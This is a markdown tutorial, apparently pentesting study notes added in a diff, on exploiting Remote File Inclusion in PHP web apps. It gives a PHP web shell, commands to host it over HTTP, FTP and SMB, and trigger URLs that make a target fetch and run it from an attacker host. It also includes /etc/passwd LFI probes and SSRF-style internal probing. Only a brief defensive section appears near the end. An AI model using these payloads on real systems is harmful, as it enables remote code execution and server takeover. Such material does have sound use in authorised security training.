@@ -1,0 +1,453 @@
+# File Inclusion – Remote File Inclusion (RFI)
+
+## Overview
+
+So far, most file inclusion attacks have focused on **Local File Inclusion (LFI)**. In some cases, however, the vulnerable function may also allow **Remote File Inclusion (RFI)**, meaning we can include files hosted on another system.
+
+RFI can provide two major advantages:
+
+- access internal-only web services and ports through **SSRF-style behavior**
+- achieve **remote code execution** by hosting and including a malicious script
+
+---
+
+# Local vs Remote File Inclusion
+
+If the vulnerable function allows remote URLs, we may be able to host a malicious script and have the target application include and execute it.
+
+## Functions that may allow RFI
+
+| Language | Function | Read Content | Execute | Remote URL |
+|---|---|---:|---:|---:|
+| PHP | `include()` / `include_once()` | ✅ | ✅ | ✅ |
+| PHP | `file_get_contents()` | ✅ | ❌ | ✅ |
+| Java | `import` | ✅ | ✅ | ✅ |
+| .NET | `@Html.RemotePartial()` | ✅ | ❌ | ✅ |
+| .NET | `include` | ✅ | ✅ | ✅ |
+
+## Important distinction
+
+Almost every RFI is also an LFI, but not every LFI is an RFI.
+
+An LFI may **not** be an RFI because:
+
+- the vulnerable function may not allow remote URLs
+- you may only control part of the filename and not the protocol (for example, `http://`)
+- server configuration may block remote inclusion entirely
+
+Also, some functions allow remote inclusion **without code execution**. In those cases, the vulnerability may still be useful for:
+
+- internal port enumeration
+- internal web app discovery
+- SSRF-style probing
+
+---
+
+# Verify Whether RFI Is Possible
+
+## Check PHP configuration
+
+In PHP, remote file inclusion usually requires:
+
+```ini
+allow_url_include = On
+```
+
+We can check this through LFI, just like in the wrapper section:
+
+```bash
+echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
+```
+
+Expected result:
+
+```ini
+allow_url_include = On
+```
+
+## More reliable method: test a remote URL directly
+
+Configuration alone is not enough. The vulnerable function itself must support remote inclusion.
+
+A better test is to try including a local URL first:
+
+```text
+http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
+```
+
+If the application includes and renders the content from that URL, then:
+
+- the page is vulnerable to RFI
+- remote URLs are accepted
+- the included file may be executed, not just displayed
+
+### Why use `127.0.0.1` first?
+
+- avoids firewall issues
+- confirms URL inclusion works
+- safer than immediately reaching out externally
+
+> Avoid recursively including the same vulnerable page if possible, as this can create loops and potentially cause a denial of service.
+
+---
+
+# RFI for Remote Code Execution
+
+Once RFI is confirmed, the next step is to host a malicious script and include it.
+
+## Basic PHP web shell
+
+```php
+<?php system($_GET["cmd"]); ?>
+```
+
+Create it locally:
+
+```bash
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+```
+
+Now host it and include it through the RFI vulnerability.
+
+---
+
+# Method 1 – RFI over HTTP
+
+## Start a local HTTP server
+
+```bash
+sudo python3 -m http.server <LISTENING_PORT>
+```
+
+Example output:
+
+```text
+Serving HTTP on 0.0.0.0 port <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/) ...
+```
+
+## Include the hosted shell
+
+```text
+http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
+```
+
+If successful, the server will fetch `shell.php`, include it, and execute:
+
+```bash
+id
+```
+
+Example listener output:
+
+```text
+SERVER_IP - - [SNIP] "GET /shell.php HTTP/1.0" 200 -
+```
+
+## Notes
+
+- use port `80` or `443` if outbound filtering is strict
+- HTTP is often the easiest and most reliable delivery method
+- inspect your listener logs to see exactly what path the target requested
+
+### Useful troubleshooting tip
+
+If the target app appends an extension such as `.php`, you may need to omit it from your payload.
+
+---
+
+# Method 2 – RFI over FTP
+
+If HTTP is blocked or filtered, FTP may still work.
+
+## Start an FTP server
+
+```bash
+sudo python -m pyftpdlib -p 21
+```
+
+Example output:
+
+```text
+[SNIP] >>> starting FTP server on 0.0.0.0:21, pid=23686 <<<
+```
+
+## Include the shell via FTP
+
+```text
+http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
+```
+
+If FTP anonymous access is not allowed, credentials can be embedded in the URL:
+
+```text
+ftp://user:pass@<OUR_IP>/shell.php
+```
+
+Example:
+
+```bash
+curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
+```
+
+Expected output:
+
+```text
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+## Notes
+
+- useful when `http://` is filtered
+- can also help bypass simplistic WAF rules
+- PHP often attempts anonymous login by default
+
+---
+
+# Method 3 – RFI over SMB (Windows)
+
+If the vulnerable application runs on a **Windows server**, SMB can sometimes be used for remote inclusion even when `allow_url_include` is not enabled.
+
+This works because Windows may treat files on remote SMB shares as normal files via **UNC paths**.
+
+## Start an SMB share with Impacket
+
+```bash
+impacket-smbserver -smb2support share $(pwd)
+```
+
+Example output:
+
+```text
+[*] Config file parsed
+[*] Callback added for UUID ...
+```
+
+## Include the shell via UNC path
+
+```text
+http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
+```
+
+If successful, the target will:
+
+1. connect to your SMB share
+2. fetch `shell.php`
+3. include and execute it
+4. run `whoami`
+
+## Notes
+
+- especially useful on Windows targets
+- may work without non-default PHP RFI settings
+- much more likely to work from the same internal network
+- outbound SMB over the internet is often blocked
+
+---
+
+# RFI as SSRF
+
+Even if code execution is not possible, RFI can still provide SSRF-like capabilities.
+
+Example:
+
+```text
+http://127.0.0.1:8080/admin
+```
+
+Potential uses:
+
+- enumerate internal admin panels
+- discover internal-only services
+- probe alternate ports
+- retrieve local web apps not externally accessible
+
+This is especially valuable in segmented environments.
+
+---
+
+# Common RFI Workflow
+
+## 1. Confirm file inclusion
+
+Try a standard LFI first:
+
+```text
+../../../../etc/passwd
+```
+
+## 2. Check whether remote inclusion is enabled
+
+Try:
+
+```text
+http://127.0.0.1:80/index.php
+```
+
+## 3. Confirm execution behavior
+
+See whether included PHP is rendered as output or executed.
+
+## 4. Host malicious script
+
+Example:
+
+```php
+<?php system($_GET["cmd"]); ?>
+```
+
+## 5. Include remote script
+
+Example:
+
+```text
+http://<OUR_IP>/shell.php&cmd=id
+```
+
+## 6. Confirm command execution
+
+Use commands like:
+
+```bash
+id
+whoami
+uname -a
+pwd
+```
+
+---
+
+# Example Commands
+
+## Create web shell
+
+```bash
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+```
+
+## Host over HTTP
+
+```bash
+sudo python3 -m http.server 80
+```
+
+## Host over FTP
+
+```bash
+sudo python -m pyftpdlib -p 21
+```
+
+## Host over SMB
+
+```bash
+impacket-smbserver -smb2support share $(pwd)
+```
+
+## Trigger via HTTP RFI
+
+```text
+http://target/index.php?language=http://<OUR_IP>/shell.php&cmd=id
+```
+
+## Trigger via FTP RFI
+
+```text
+http://target/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
+```
+
+## Trigger via SMB RFI
+
+```text
+http://target/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
+```
+
+---
+
+# Quick Comparison
+
+| Method | Best For | Requirements | Notes |
+|---|---|---|---|
+| HTTP | most cases | outbound HTTP allowed | easiest and most common |
+| FTP | HTTP filtered/blocked | outbound FTP allowed | useful WAF bypass angle |
+| SMB | Windows targets | SMB reachable | often better internally |
+
+---
+
+# Common Pitfalls
+
+- `allow_url_include` is off
+- remote URLs are blocked by the function itself
+- app only allows partial filename control
+- `.php` extension appended automatically
+- outbound firewall blocks HTTP/FTP/SMB
+- recursive inclusion causes instability
+- listener is not on a reachable port
+
+---
+
+# Indicators of Successful RFI RCE
+
+- your server receives a request for `shell.php`
+- command output is shown in the response
+- the included file is executed rather than displayed
+- output reveals backend context such as:
+
+```text
+uid=33(www-data)
+```
+
+or
+
+```text
+nt authority\system
+```
+
+---
+
+# Security Impact
+
+Remote File Inclusion can be critical because it may lead directly to:
+
+- remote code execution
+- web shell deployment
+- reverse shells
+- internal service enumeration
+- full compromise of the application server
+
+---
+
+# Defensive Measures
+
+- disable remote file inclusion features
+- set `allow_url_include=Off`
+- never pass unsanitized user input to include-like functions
+- use strict allowlists for templates/pages
+- block outbound traffic where unnecessary
+- monitor for unusual external HTTP/FTP/SMB requests
+- log and alert on UNC path access from web applications
+
+---
+
+# Key Takeaways
+
+- RFI is often more dangerous than LFI because it can lead directly to code execution
+- always verify RFI with a safe local URL first
+- HTTP is the easiest delivery method for remote shells
+- FTP can help bypass filtering
+- SMB is especially useful against Windows targets
+- even without RCE, RFI can often be abused for SSRF-style internal enumeration
+
+---
+
+# Tags
+
+#file-inclusion
+#rfi
+#lfi
+#rce
+#php
+#php-security
+#ssrf
+#webshell
+#pentesting
+#owasp
+#
